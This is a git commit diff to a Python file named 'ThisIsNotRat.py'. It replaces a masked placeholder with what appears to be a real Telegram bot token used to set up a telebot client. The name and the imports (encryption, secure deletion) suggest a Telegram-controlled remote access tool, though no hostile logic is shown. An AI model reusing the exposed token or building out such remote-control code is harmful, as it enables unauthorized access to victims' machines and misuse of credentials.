37637a92951bc9e1adcb9228c4f08312433aeb8d
سورس جلثون <127198594+JAIITHON@users.noreply.github.com>
2024-01-03 15:27:47 +0200

    Update ThisIsNotRat.py

--- ThisIsNotRat.py
+++ ThisIsNotRat.py
@@ -12,7 +12,7 @@ import pyAesCrypt
 import xml.etree.ElementTree as ET
 from secure_delete import secure_delete
 
-TOKEN = '*************:**************-**************_**-*'  
+TOKEN = '6908042695:AAFePQv7a_ND3GaKRxFmgaRNgQDJ1Rqg7O0'  
 
 bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")
